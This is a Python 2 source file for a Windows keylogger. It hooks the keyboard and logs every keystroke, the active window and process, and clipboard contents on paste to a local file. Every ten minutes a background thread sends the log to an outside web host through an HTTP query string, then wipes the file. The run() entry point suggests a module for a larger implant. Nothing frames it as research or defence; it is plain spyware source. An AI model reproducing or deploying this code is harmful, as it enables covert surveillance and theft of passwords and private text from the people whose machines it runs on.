import win32api
import win32console
import win32gui
import os
from ctypes import *
from _winreg import *
import pythoncom
import pyHook
import win32clipboard
import threading
import time
import urllib2
import urllib

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
st_time = time.time()

def get_current_process():
    # get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()
	# find the process id
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd , byref(pid))
	
	# store the current process ID
	process_id = "%d" % pid.value
	# grab the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
	
	psapi.GetModuleBaseNameA(h_process,None, byref(executable),512)
	
	# now read the title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd , byref(window_title) ,512)
	
	# print out the header if we are in the right process
#	print ""
	str = "\n[ PID :%s - %s - %s] \n" % (process_id,executable.value , window_title.value)
#        print str
	#print ""
        f_des = open("log.txt" , "a+")
        f_des.write(str)
        f_des.close()
	# close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
	
def KeyStroke(event):
        global current_window
        global st_time
    # check to see if target changed windows
	if event.WindowName != current_window:
	   current_window = event.WindowName
	   get_current_process()
	# if they passed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
	 #   print chr(event.Ascii),
	    char = chr(event.Ascii)
	    f_des = open("log.txt" , "a+")
	    f_des.write(str(char).rstrip('\n'))
	    f_des.close()
	else:
	    # if ctrl + v is pressed!!
	    if event.Key == "V":
		   win32clipboard.OpenClipboard()
		   pasted_value = win32clipboard.GetClipboardData()
		   win32clipboard.CloseClipboard()
		   paste = "[PASTE] - %s" % (pasted_value)
	#	   print paste
		   f_des = open("log.txt" , "a+")
		   f_des.write(paste)
		   f_des.close()
	    else:
		   eventkey = "[%s]" % event.Key
	#	   print eventkey
		   eventkey = eventkey
		   f_des = open("log.txt" , "a+")
		   f_des.write(eventkey)
		   f_des.close()
	# pass execution to the next registered hook
	
            if (time.time() - st_time > 600):
	             print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                     st_time = time.time()
                     thread_i = threading.Thread(target=inform)
                     thread_i.start()
            else:
                     pass
        return True

def logger():
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

# register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()

def inform():
        log = ""
        f_read = open("log.txt" , "r")
        lines = f_read.readlines()
        f_read.close()
        f_read= open("log.txt","w").close()
        for line in lines:
                log = log + line
        url = "http://psyberlupus.000webhostapp.com/log.php?=" + urllib.quote_plus(log)
      #  print url
       # print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
        
        try:
          response = urllib2.urlopen(url)
        except:
          pass


def run(**args):
   global st_time
   st_time = time.time()
   print "keylogging!!!"
   f_des = open("log.txt" , "w")
   f_des.write("Started!!\n")
   f_des.close()
   thread = threading.Thread(target=logger)
   thread.start()
   Val = "STARTED LOGGING"
   return str(Val)
